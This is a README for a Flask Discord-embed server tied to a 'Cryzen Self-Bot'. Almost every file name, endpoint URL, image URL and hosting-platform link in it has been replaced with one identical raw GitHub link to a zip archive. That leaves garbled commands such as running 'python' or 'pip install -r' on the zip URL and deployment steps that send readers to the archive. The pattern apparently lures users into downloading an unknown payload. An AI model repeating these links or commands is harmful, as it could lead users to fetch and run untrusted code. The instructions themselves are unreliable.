# Cryzen Discord Embed Server

A standalone Flask server for creating custom Discord embeds using Open Graph meta tags.

## 🚀 Features

- Create custom Discord embeds with Open Graph tags
- RESTful API for embed management
- Beautiful embed preview pages
- Health check endpoint
- Ready for deployment on free platforms

## 📁 Files

- `https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip` - Main Flask application
- `https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip` - Python dependencies
- `Procfile` - Process configuration for deployment
- `https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip` - This documentation

## 🌐 API Endpoints

### POST /create
Create a new Discord embed.

**Request Body:**
```json
{
  "title": "Your Embed Title",
  "description": "Your embed description",
  "image_url": "https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip",
  "color": "#0099ff",
  "og_type": "website",
  "site_name": "Your Site Name"
}
```

**Response:**
```json
{
  "success": true,
  "embed_id": "a1b2c3d4",
  "url": "https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip",
  "message": "Embed created successfully"
}
```

### GET /embed/{embed_id}
View the embed page (this is what Discord will fetch).

### GET /list
List all active embeds.

### GET /health
Health check endpoint.

## 🚀 Deployment Options

### Option 1: Render (Recommended)
1. Go to [https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip](https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip)
2. Click "New +" → "Web Service"
3. Connect your GitHub repository or upload files
4. Set build command: `pip install -r https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip`
5. Set start command: `gunicorn app:app`
6. Deploy!

### Option 2: Railway
1. Go to [https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip](https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip)
2. Click "Deploy from GitHub repo" or "Deploy from template"
3. Upload your files
4. Railway will auto-detect Flask and deploy

### Option 3: Heroku
1. Go to [https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip](https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip)
2. Create new app
3. Connect to GitHub or use Git deploy
4. Push your code
5. The Procfile will handle the rest

### Option 4: PythonAnywhere (Free tier available)
1. Go to [https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip](https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip)
2. Upload files to your account
3. Set up a web app with Flask
4. Point to your https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip file

## 🧪 Local Testing

```bash
# Install dependencies
pip install -r https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip

# Run the server
python https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip
```

Server will start on `http://localhost:5000`

## 🎭 Usage with Cryzen Self-Bot

Once deployed, update your Cryzen self-bot configuration to use your new public URL:

```python
# Replace the embed server URL in your bot
EMBED_SERVER_URL = "https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip"  # or your deployment URL

# Create embeds by making POST requests to /create
# Use the returned URL in Discord messages
```

## 📝 Example Usage

```bash
# Create an embed
curl -X POST https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip \
  -H "Content-Type: application/json" \
  -d '{
    "title": "My Custom Embed",
    "description": "This is a custom Discord embed!",
    "image_url": "https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip"
  }'

# Response will give you the embed URL to use in Discord
```

## 🔧 Environment Variables

- `PORT` - Server port (automatically set by most platforms)

## 📄 License

This project is part of the Cryzen Self-Bot system.

---

**🚀 Powered by Cryzen Self-Bot**  
Advanced Discord embed control system